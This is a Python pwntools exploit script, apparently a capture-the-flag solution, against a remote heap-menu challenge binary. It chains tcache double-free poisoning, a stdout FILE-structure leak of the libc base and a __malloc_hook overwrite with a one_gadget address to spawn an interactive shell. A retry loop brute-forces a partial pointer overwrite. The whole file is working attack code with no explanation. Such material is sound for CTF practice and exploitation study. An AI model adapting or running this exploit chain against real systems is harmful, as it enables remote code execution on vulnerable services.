#!/usr/bin/env python
from pwn import *
context.arch='amd64'
context.log_level='debug'
# p=remote('90b826377a05d5e9508314e76f2f1e4e.kr-lab.com',40001)
ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)


def debugf(payload=''):
    gdb.attach(p,payload)

def login(username,psw):
    ru(':')
    sd(username)
    ru(':')
    sd(psw)


def menu(i):
    ru('>\n')
    sl(str(i))

def add(size=0x60,des='b'*60,name='a'*0x10):
    menu(1)
    ru(':')
    sd(name)
    ru(':')
    sd(str(size))
    ru(':')
    sd(des)

def delete(index):
    menu(2)
    ru(':')
    sl(str(index))
def exit():
    menu(3)

def ioleak(flags=0xfbad1000,over_payload='\x00'):

    if flags & 0x800==0:
        flags=flags | 0x800

    if flags & 0x1000==0:
        flags=flags | 0x1000

    read_base=read_ptr=read_end=0

    payload=p64(flags)
    payload+=p64(read_ptr)+p64(read_end)+p64(read_base)
    payload+=over_payload
    return payload

# pos=0
def exp():
    login('admin\n','frame\n')
    # debugf()
    add(0x60)             # 0
    delete(0)
    delete(0)
    delete(0)

    # debugf()
    # pos=1
    # print('1111111111111111111111111111111')
    # delete(0)
    # delete(0)
    # delete(0)
    # delete(0)

    add(0x60,'\x80\x44')  # 1
    sleep(0.2)
    add(0x60)             # 2

    add(0x60,'\x60\x97')  # 3 can not free
    # print('222222222222222222222222222222222')
    # pos=2
    sleep(0.2)
    delete(0)
    delete(0)
    delete(0)
    delete(0)
    # pos=3
    add(0x70)          # 4
    delete(4)
    delete(4)
    delete(4)
    # pos=4
    # delete(3)
    add(0x70,p64(0x602060))

    add(0x70)
    add(0x70,'\x00'*0x70)

    # pos=5
    # print('33333333333333333333333333333333333')
    add(0x60,'\x80\x44')   # 0
    add(0x60,'\x00\n')       # 1
    add(0x60,'\x00\n')       # 2

    # pos=6
    print('================================')
    payload=ioleak(0xfbad2887)
    # print(payload)
    # pause()
    add(0x60,payload)     # libc

    # pos=7

    line=ru('>')
    libc_base=u64(line[8:16])-0x3ed8b0
    # print('44444444444444444444444444444444')
    # print(line)

    print(hex(libc_base))
    # pause()

    one_off=0x4f2c5
    one_off=0x4f322
    one_off=0x10a38c
    # one_off=0x50186
    # one_off=0x501e3
    # one_off=0x103f50
    one=libc_base+one_off
    malloc_hook=libc_base+0x3ebc30

    sl('2')
    ru(':')
    sl('0')
    delete(0)
    delete(0)
    add(0x60,p64(malloc_hook))
    add(0x60,'0\n')

    add(0x60,p64(one))
    menu(1)
    p.interactive()

while(1):
    try:
        # p=remote('1c0e562267cef024c5fea2950a3c9bea.kr-lab.com',40001)
        p=remote('90b826377a05d5e9508314e76f2f1e4e.kr-lab.com',40001)
        # p=process(['./ld-2.28.so','./pwn'],env={'LD_PRELOAD':'./libc-2.28.so'})
        exp()
        break   
    except:
        p.close()
        # times+=1
        # print(pos)
        # pos=1
        # pause()
        continue
# print(times)